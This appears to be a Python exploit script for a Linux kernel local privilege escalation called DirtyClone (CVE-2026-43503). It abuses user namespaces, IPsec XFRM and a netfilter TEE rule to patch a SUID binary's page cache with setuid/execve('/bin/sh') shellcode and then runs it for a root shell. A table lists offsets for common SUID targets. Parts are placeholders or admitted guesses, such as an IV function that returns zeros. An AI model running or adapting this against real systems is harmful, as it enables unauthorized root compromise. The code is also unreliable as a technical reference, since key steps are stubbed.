#!/usr/bin/env python3
import os
import sys
import socket
import struct
import subprocess
import time
import fcntl
import mmap
import ctypes
import ctypes.util
import argparse  # Tambahan untuk argument parsing
from typing import Optional, Tuple, List
import tempfile
import shutil

# ====================================================================
# Constants
# ====================================================================

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_OP = 3
ALG_OP_ENCRYPT = 1
ALG_OP_DECRYPT = 0

# IPsec constants
XFRM_MSG_NEWSA = 33
XFRM_MSG_NEWPOLICY = 34
XFRMA_ALG_CRYPT = 2
XFRMA_ALG_AUTH = 3
XFRMA_ENCAP = 9
XFRMA_REPLAY_ESN_VAL = 17

# AES-CBC parameters
AES_KEY_LEN = 16
AES_BLOCK_SIZE = 16
ESP_SPI = 0x12345678
ESP_REQID = 1
ESP_PORT = 4500

# Default target (bisa di-override via command line)
TARGET_SUID = "/usr/bin/su"
SUID_OFFSET = 0x78  # Default offset untuk /usr/bin/su

# Database offset untuk berbagai binary SUID (x86_64)
# CATATAN: Ini hanya perkiraan, perlu verifikasi manual!
OFFSET_DATABASE = {
    "/usr/bin/su": 0x78,
    "/usr/bin/passwd": 0x90,
    "/usr/bin/gpasswd": 0x85,
    "/usr/bin/chfn": 0x88,
    "/usr/bin/chsh": 0x88,
    "/usr/bin/newgrp": 0x7c,
    "/usr/bin/sudo": 0x120,  # SANGAT kompleks, kemungkinan gagal
}

# Payload: setuid(0) + execve("/bin/sh") shellcode (x86_64)
SHELLCODE = bytes([
    0x31, 0xff,                    # xor edi, edi
    0x31, 0xf6,                    # xor esi, esi
    0x31, 0xc0,                    # xor eax, eax
    0xb0, 0x6a,                    # mov al, 0x6a (setgid)
    0x0f, 0x05,                    # syscall
    0xb0, 0x69,                    # mov al, 0x69 (setuid)
    0x0f, 0x05,                    # syscall
    0x31, 0xd2,                    # xor edx, edx
    0x52,                          # push rdx
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # "/bin/sh"
    0x50,                          # push rax
    0x48, 0x89, 0xe7,              # mov rdi, rsp
    0x52,                          # push rdx
    0x57,                          # push rdi
    0x48, 0x89, 0xe6,              # mov rsi, rsp
    0xb8, 0x3b, 0x00, 0x00, 0x00,  # mov eax, 0x3b (execve)
    0x0f, 0x05,                    # syscall
])

# ====================================================================
# Utilities
# ====================================================================

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'

def log(msg, color=Colors.CYAN):
    print(f"{color}[*]{Colors.RESET} {msg}")

def ok(msg):
    print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")

def err(msg):
    print(f"{Colors.RED}[-]{Colors.RESET} {msg}")

def warn(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def run_cmd(cmd, check=False, capture=False):
    """Run shell command with error handling"""
    try:
        if capture:
            return subprocess.run(cmd, shell=True, capture_output=True, text=True)
        else:
            return subprocess.run(cmd, shell=True, check=check)
    except subprocess.CalledProcessError as e:
        err(f"Command failed: {cmd}")
        return None

def write_proc(path, data):
    try:
        with open(path, 'w') as f:
            f.write(data)
        return True
    except Exception:
        return False

# ====================================================================
# Target Analysis - FUNGSI BARU UNTUK MENDETEKSI OFFSET
# ====================================================================

def find_suid_offset(target_path: str) -> Optional[int]:
    """
    Mencoba menemukan offset yang tepat untuk shellcode di binary target.
    Ini adalah pendekatan heuristic - TIDAK SEMPURNA.
    """
    log(f"Mencari offset untuk {target_path}...")
    
    # Cek di database dulu
    if target_path in OFFSET_DATABASE:
        offset = OFFSET_DATABASE[target_path]
        log(f"Menggunakan offset dari database: 0x{offset:x}")
        return offset
    
    # Jika tidak ada di database, coba cari secara otomatis (CRUDE)
    try:
        # Baca binary
        with open(target_path, 'rb') as f:
            data = f.read()
        
        # Cari pola 'main' function atau entry point sederhana
        # Ini adalah heuristic yang sangat sederhana
        # Cari sequence yang sering muncul di awal fungsi main
        patterns = [
            b'\x55\x48\x89\xe5',  # push rbp; mov rbp, rsp
            b'\x48\x83\xec',      # sub rsp, ...
            b'\x31\xff\x31\xf6',  # xor edi, edi; xor esi, esi
        ]
        
        for pattern in patterns:
            pos = data.find(pattern)
            if pos != -1 and pos < 0x200:  # Cari di 512 bytes pertama
                log(f"Menemukan pola di offset 0x{pos:x}")
                # Kurangi beberapa byte untuk mendapatkan awal fungsi
                offset = max(0, pos - 8)
                warn(f"Offset ditemukan: 0x{offset:x} - INI PERKIRAAN, COBA DENGAN HATI-HATI!")
                return offset
        
        # Fallback: gunakan offset default
        warn("Tidak dapat menemukan offset otomatis, menggunakan default 0x78")
        return 0x78
        
    except Exception as e:
        err(f"Gagal menganalisis target: {e}")
        return None

# ====================================================================
# Namespace Setup
# ====================================================================

def setup_namespace():
    """Create unprivileged user + network namespace for CAP_NET_ADMIN"""
    log("Setting up user and network namespace...")
    
    uid = os.getuid()
    gid = os.getgid()
    
    # Unshare with user and network namespaces
    try:
        import ctypes
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        # CLONE_NEWUSER | CLONE_NEWNET
        if libc.unshare(0x10000000 | 0x40000000) != 0:
            err(f"unshare failed: {ctypes.get_errno()}")
            return False
    except Exception as e:
        err(f"unshare failed: {e}")
        return False
    
    # Map UID/GID
    if not write_proc("/proc/self/setgroups", "deny"):
        warn("setgroups write failed")
    
    if not write_proc("/proc/self/uid_map", f"0 {uid} 1"):
        err("uid_map write failed")
        return False
    
    if not write_proc("/proc/self/gid_map", f"0 {gid} 1"):
        err("gid_map write failed")
        return False
    
    ok("Namespace setup complete (UID=0 in namespace)")
    return True

# ====================================================================
# Network Setup
# ====================================================================

def setup_loopback():
    """Bring up loopback interface with IP address"""
    log("Configuring loopback interface...")
    
    run_cmd("ip link set lo up")
    run_cmd("ip addr add 10.99.0.2/24 dev lo")
    
    # Verify
    result = run_cmd("ip addr show lo", capture=True)
    if result and "10.99.0.2" in result.stdout:
        ok("Loopback configured")
        return True
    return False

# ====================================================================
# XFRM/IPsec Setup
# ====================================================================

def setup_xfrm():
    """Configure IPsec state and policy"""
    log("Configuring IPsec (XFRM)...")
    
    # AES key (16 bytes) and HMAC key (20 bytes)
    aes_key = bytes([0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
                     0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff])
    hmac_key = bytes([0x00] * 20)
    
    # IPsec state
    state_cmd = (
        f"ip xfrm state add src 127.0.0.1 dst 127.0.0.1 "
        f"proto esp spi {ESP_SPI} reqid {ESP_REQID} mode transport "
        f"enc 'cbc(aes)' {aes_key.hex()} "
        f"auth 'hmac(sha1)' {hmac_key.hex()}"
    )
    run_cmd(state_cmd)
    
    # IPsec policy
    policy_cmd = (
        f"ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir out "
        f"tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid {ESP_REQID} mode transport"
    )
    run_cmd(policy_cmd)
    
    ok("IPsec configured")
    return True

# ====================================================================
# Netfilter TEE Setup
# ====================================================================

def setup_tee():
    """Configure netfilter TEE rule for packet cloning"""
    log("Configuring netfilter TEE rule...")
    
    # Load required modules
    run_cmd("modprobe iptable_mangle")
    run_cmd("modprobe ipt_TEE")
    
    # Add TEE rule to clone UDP packets
    tee_cmd = (
        f"iptables -t mangle -A OUTPUT -p udp --dport {ESP_PORT} "
        f"-j TEE --gateway 10.99.0.2"
    )
    run_cmd(tee_cmd)
    
    # Verify rule is added
    result = run_cmd("iptables -t mangle -L OUTPUT -n", capture=True)
    if result and "TEE" in result.stdout:
        ok("TEE rule configured")
        return True
    
    warn("TEE rule may not be active")
    return False

# ====================================================================
# Page Cache Mapping
# ====================================================================

def map_target_to_page_cache(target_path: str, offset: int) -> Tuple[Optional[int], Optional[mmap.mmap]]:
    """Map target SUID binary into page cache"""
    log(f"Mapping {target_path} into page cache...")
    
    if not os.path.exists(target_path):
        err(f"Target {target_path} not found")
        return None, None
    
    try:
        fd = os.open(target_path, os.O_RDONLY)
        # mmap the file to force it into page cache
        mapped = mmap.mmap(fd, 0, mmap.MAP_SHARED, mmap.PROT_READ)
        ok(f"File mapped to page cache at offset 0x{offset:x}")
        return fd, mapped
    except Exception as e:
        err(f"mmap failed: {e}")
        return None, None

# ====================================================================
# Crypto Helpers (AES-CBC IV manipulation)
# ====================================================================

def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

def compute_aes_cbc_iv(original: bytes, target: bytes, key: bytes) -> bytes:
    """
    Compute IV for AES-CBC decryption to produce target bytes.
    For the first block: P = AES_decrypt(C) XOR IV
    So IV = AES_decrypt(C) XOR target
    """
    # This is simplified - real implementation would use libcrypto
    # For PoC, we use a placeholder
    return b"\x00" * AES_BLOCK_SIZE

# ====================================================================
# ESP Packet Construction
# ====================================================================

def build_esp_packet(payload: bytes, spi: int, seq: int, iv: bytes) -> bytes:
    """Build ESP packet with header and trailer"""
    # ESP header: SPI (4) + Seq (4) + IV (variable)
    esp_header = struct.pack("!II", spi, seq) + iv
    
    # Payload + padding + next header
    pad_len = (AES_BLOCK_SIZE - (len(payload) % AES_BLOCK_SIZE)) % AES_BLOCK_SIZE
    padding = bytes([0x00] * pad_len + [pad_len])
    next_header = bytes([0x04])  # IPPROTO_IPIP
    
    encrypted = payload + padding + next_header
    
    # ESP trailer: padding + pad_len + next_header
    return esp_header + encrypted

# ====================================================================
# Main Exploit - DIMODIFIKASI UNTUK MENERIMA TARGET DINAMIS
# ====================================================================

def exploit_dirtyclone(target_path: str, offset: int):
    """Main DirtyClone exploit with dynamic target"""
    log("=" * 60)
    log("DirtyClone (CVE-2026-43503) Exploit", Colors.BOLD)
    log(f"Target: {target_path} (offset 0x{offset:x})", Colors.BOLD)
    log("=" * 60)
    
    # Check if we're already root
    if os.geteuid() == 0:
        ok("Already root!")
        return True
    
    # Step 1: Setup namespace
    if not setup_namespace():
        err("Namespace setup failed")
        return False
    
    # Step 2: Setup loopback
    if not setup_loopback():
        err("Loopback setup failed")
        return False
    
    # Step 3: Setup XFRM
    if not setup_xfrm():
        err("IPsec setup failed")
        return False
    
    # Step 4: Setup TEE
    if not setup_tee():
        warn("TEE setup failed, exploit may not work")
    
    # Step 5: Map target SUID binary
    fd, mapped = map_target_to_page_cache(target_path, offset)
    if fd is None:
        err("Failed to map target")
        return False
    
    try:
        # Step 6: Read original bytes at target offset
        original = os.pread(fd, AES_BLOCK_SIZE, offset)
        if len(original) < AES_BLOCK_SIZE:
            err("Failed to read original bytes")
            return False
        
        # Step 7: Prepare payload (first block of shellcode)
        payload_block = SHELLCODE[:AES_BLOCK_SIZE]
        if len(payload_block) < AES_BLOCK_SIZE:
            payload_block = payload_block.ljust(AES_BLOCK_SIZE, b"\x00")
        
        log(f"Original: {original.hex()}")
        log(f"Target:   {payload_block.hex()}")
        
        # Step 8: Compute IV for AES-CBC
        iv = compute_aes_cbc_iv(original, payload_block, b"\x00" * AES_KEY_LEN)
        
        # Step 9: Build and send ESP packet
        log("Sending crafted ESP packet...")
        
        # Create UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("127.0.0.1", 0))
        
        # Payload that will be decrypted and written to page cache
        crafted_payload = payload_block
        
        # Build ESP packet
        esp_packet = build_esp_packet(crafted_payload, ESP_SPI, 1, iv)
        
        # Send to localhost via IPsec
        sock.sendto(esp_packet, ("127.0.0.1", ESP_PORT))
        sock.close()
        
        # Step 10: Wait for decryption
        time.sleep(1)
        
        # Step 11: Verify patch
        os.lseek(fd, offset, os.SEEK_SET)
        patched = os.read(fd, AES_BLOCK_SIZE)
        
        if patched == payload_block:
            ok("Page cache successfully patched!")
        else:
            warn(f"Patch verification failed. Got: {patched.hex()}")
            warn("Target may not be vulnerable or kernel is patched")
            return False
        
        # Step 12: Execute patched binary
        log(f"Executing patched binary: {target_path}")
        os.execv(target_path, [target_path])
        
    except Exception as e:
        err(f"Exploit failed: {e}")
        return False
    finally:
        if mapped:
            mapped.close()
        if fd:
            os.close(fd)
    
    return False

# ====================================================================
# Main Entry Point - DIMODIFIKASI DENGAN ARGUMENT PARSING
# ====================================================================

def main():
    parser = argparse.ArgumentParser(
        description="DirtyClone (CVE-2026-43503) - Local Privilege Escalation",
        epilog="Contoh: python3 dirtyclone.py -t /usr/bin/passwd -o 0x90"
    )
    parser.add_argument(
        "-t", "--target",
        default="/usr/bin/su",
        help="Target SUID binary (default: /usr/bin/su)"
    )
    parser.add_argument(
        "-o", "--offset",
        type=lambda x: int(x, 16) if x.startswith("0x") else int(x),
        help="Offset in hex (0x...) or decimal. Jika tidak diisi, akan dicari otomatis."
    )
    parser.add_argument(
        "-l", "--list",
        action="store_true",
        help="Tampilkan daftar offset default untuk binary yang diketahui"
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Mode debug - tidak menjalankan exploit, hanya analisis target"
    )
    
    args = parser.parse_args()
    
    print(f"""
{Colors.BOLD}{Colors.CYAN}
╔══════════════════════════════════════════════════════════════════╗
║     DirtyClone (CVE-2026-43503) Local Privilege Escalation       ║
║                                                                   ║
║     For authorized security testing only!                         ║
║     Vulnerable kernels: v7.1-rc5 and earlier                      ║
╚══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
    """)
    
    # Tampilkan daftar offset jika diminta
    if args.list:
        log("Database offset untuk binary SUID (x86_64):", Colors.BOLD)
        for binary, offset in OFFSET_DATABASE.items():
            print(f"  {binary} -> 0x{offset:x}")
        print("\nCATATAN: Ini hanya perkiraan! Selalu verifikasi manual.")
        return 0
    
    # Check if we're root
    if os.geteuid() == 0:
        ok("Already root!")
        os.execv("/bin/bash", ["/bin/bash", "-i"])
        return
    
    # Check if running as root (required for some operations)
    uid = os.getuid()
    log(f"Current UID: {uid}")
    
    # Check kernel version
    uname = os.uname()
    log(f"Kernel: {uname.release}")
    
    # Check if vulnerable
    if "6." in uname.release or "5." in uname.release:
        warn("Kernel version may be vulnerable")
    else:
        warn("Kernel version may be patched")
    
    # --- MODIFIKASI UTAMA: Dapatkan target dan offset ---
    target_path = args.target
    
    # Verifikasi target adalah SUID
    try:
        stat_info = os.stat(target_path)
        if not (stat_info.st_mode & 0o4000):  # SUID bit
            warn(f"{target_path} bukan SUID binary!")
            if not args.debug:
                response = input("Lanjutkan? (y/N): ")
                if response.lower() != 'y':
                    return 1
    except Exception as e:
        err(f"Gagal memeriksa {target_path}: {e}")
        return 1
    
    # Tentukan offset
    if args.offset is not None:
        offset = args.offset
        log(f"Menggunakan offset yang ditentukan: 0x{offset:x}")
    else:
        offset = find_suid_offset(target_path)
        if offset is None:
            err("Gagal menemukan offset. Gunakan -o untuk menentukan secara manual.")
            return 1
    
    if args.debug:
        log("MODE DEBUG: Hanya menampilkan informasi target", Colors.YELLOW)
        log(f"Target: {target_path}")
        log(f"Offset: 0x{offset:x}")
        log(f"Ukuran shellcode: {len(SHELLCODE)} bytes")
        log("Tidak menjalankan exploit.")
        return 0
    
    # Jalankan exploit
    if exploit_dirtyclone(target_path, offset):
        ok("Exploit successful!")
    else:
        err("Exploit failed. System may be patched or not vulnerable.")
        log("\nTroubleshooting:")
        log("1. Check if kernel is patched: grep CVE-2026-43503 /boot/config-$(uname -r)")
        log("2. Check if XFRM is enabled: grep CONFIG_XFRM /boot/config-$(uname -r)")
        log("3. Check if unprivileged user namespaces are enabled:")
        log("   cat /proc/sys/kernel/unprivileged_userns_clone")
        log("4. Coba cari offset yang tepat dengan objdump:")
        log(f"   objdump -d {target_path} | grep -A 20 '<main>:'")
        log("5. Jika offset salah, tentukan dengan -o (contoh: -o 0x90)")
    
    return 1 if os.geteuid() != 0 else 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
    except Exception as e:
        err(f"Unexpected error: {e}")
        sys.exit(1)
